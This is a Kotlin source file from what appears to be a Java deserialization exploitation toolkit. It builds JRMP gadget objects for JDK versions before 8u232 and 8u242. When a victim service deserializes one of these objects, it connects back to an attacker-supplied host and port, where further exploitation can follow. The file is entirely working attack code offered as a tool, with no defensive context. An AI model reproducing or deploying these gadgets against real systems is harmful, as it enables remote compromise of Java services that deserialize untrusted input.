package top.ceclin.jser.tool.jrmp

import org.joor.Reflect
import sun.rmi.server.UnicastRef
import sun.rmi.transport.LiveRef
import sun.rmi.transport.tcp.TCPEndpoint
import top.ceclin.jser.tool.Gadget
import top.ceclin.jser.tool.PayloadOfGadget
import java.io.ByteArrayInputStream
import java.io.ObjectInputStream
import java.lang.reflect.Proxy
import java.rmi.Remote
import java.rmi.registry.Registry
import java.rmi.server.ObjID
import java.rmi.server.RMIServerSocketFactory
import java.rmi.server.RemoteObjectInvocationHandler
import java.rmi.server.UnicastRemoteObject
import kotlin.random.Random

/**
 * Gadgets that make victim send operation packets to server through JRMP protocol.
 *
 * `-Dsun.rmi.client.logCalls=true` and `-Djava.rmi.client.logCalls=true` can be helpful when debugging.
 */
interface JRMPGadget {
    object Before8u232 {
        operator fun invoke(host: String, port: Int): Gadget {
            val ref = UnicastRef(LiveRef(ObjID(Random.nextInt()), TCPEndpoint(host, port), false))
            val handler = RemoteObjectInvocationHandler(ref)
            return Proxy.newProxyInstance(
                Registry::class.java.classLoader,
                arrayOf(Registry::class.java),
                handler,
            )
        }
    }

    /**
     * It will create a listener thread, which prevent jvm from exiting?
     */
    object Before8u242 {
        operator fun invoke(host: String, port: Int): Gadget {
            val ref = UnicastRef(LiveRef(ObjID(Random.nextInt()), TCPEndpoint(host, port), false))
            val handler = RemoteObjectInvocationHandler(ref)
            val proxy = Proxy.newProxyInstance(
                RMIServerSocketFactory::class.java.classLoader,
                arrayOf(RMIServerSocketFactory::class.java, Remote::class.java),
                handler,
            )
            return Reflect.onClass(UnicastRemoteObject::class.java)
                .create()
                .set("ssf", proxy)
                .get<UnicastRemoteObject>()
        }
    }
}